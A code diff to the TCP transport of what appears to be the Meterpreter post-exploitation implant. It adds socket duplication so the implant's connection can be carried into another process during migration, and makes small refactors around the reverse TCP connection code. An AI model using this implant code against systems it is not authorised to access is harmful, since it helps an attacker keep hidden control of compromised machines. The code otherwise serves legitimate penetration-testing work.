@@ -5,6 +5,13 @@
 #include "../../common/common.h"
 #include <ws2tcpip.h>
 
+typedef struct _TCPMIGRATECONTEXT
+{
+	COMMONMIGRATECONTEXT common;
+	WSAPROTOCOL_INFO info;
+
+} TCPMIGRATECONTEXT, * LPTCPMIGRATECONTEXT;
+
 // These fields aren't defined unless the SDK version is set to something old enough.
 // So we define them here instead of dancing with SDK versions, allowing us to move on
 // and still support older versions of Windows.
@@ -33,7 +40,6 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockA
 	int start = current_unix_timestamp();
 	do
 	{
-		int retryStart = current_unix_timestamp();
 		if ((result = connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR)
 		{
 			break;
@@ -807,11 +813,11 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
  * @param transport Pointer to the TCP transport containing the socket.
  * @return The current transport socket FD, if any, or zero.
  */
-static SOCKET transport_get_socket_tcp(Transport* transport)
+static DWORD transport_get_socket_tcp(Transport* transport)
 {
 	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
 	{
-		return ((TcpTransportContext*)transport->ctx)->fd;
+		return (DWORD)((TcpTransportContext*)transport->ctx)->fd;
 	}
 
 	return 0;
@@ -1139,7 +1145,7 @@ DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompl
 /*!
  * @brief Create a configuration block from the given transport.
  * @param transport Transport data to create the configuration from.
- * @return config Pointer to the config block to write to.
+ * @param config Pointer to the config block to write to.
  */
 void transport_write_tcp_config(Transport* transport, MetsrvTransportTcp* config)
 {
@@ -1150,6 +1156,30 @@ void transport_write_tcp_config(Transport* transport, MetsrvTransportTcp* config
 		config->common.retry_wait = transport->timeouts.retry_wait;
 		wcsncpy(config->common.url, transport->url, URL_SIZE);
 	}
+}
+
+/*!
+ * @brief Create a migration context that works for TCP transports.
+ * @param transport Pointer to the transport in question.
+ * @param targetProcessId ID of the process we'll be migrating into.
+ * @param contextSize Pointer to a buffer that receives the context size.
+ * @param contextBuffer Pointer to a buffer that receives the context data.
+ * @return Indication of success or failure.
+ */
+static DWORD get_migrate_context_tcp(Transport* transport, DWORD targetProcessId, HANDLE targetProcessHandle, LPDWORD contextSize, PBYTE* contextBuffer)
+{
+	LPTCPMIGRATECONTEXT ctx = (LPTCPMIGRATECONTEXT)calloc(1, sizeof(TCPMIGRATECONTEXT));
+
+	// Duplicate the socket for the target process if we are SSL based
+	if (WSADuplicateSocket(((TcpTransportContext*)transport->ctx)->fd, targetProcessId, &ctx->info) != NO_ERROR)
+	{
+		free(ctx);
+		return WSAGetLastError();
+	}
+
+	*contextSize = sizeof(TCPMIGRATECONTEXT);
+	*contextBuffer = (PBYTE)ctx;
+	return ERROR_SUCCESS;
 }
 
 /*!
@@ -1178,9 +1208,10 @@ Transport* transport_create_tcp(MetsrvTransportTcp* config)
 	transport->transport_destroy = transport_destroy_tcp;
 	transport->transport_reset = transport_reset_tcp;
 	transport->server_dispatch = server_dispatch_tcp;
-	transport->get_socket = transport_get_socket_tcp;
+	transport->get_handle = transport_get_socket_tcp;
 	transport->ctx = ctx;
 	transport->comms_last_packet = current_unix_timestamp();
+	transport->get_migrate_context = get_migrate_context_tcp;
 
 	return transport;
 }
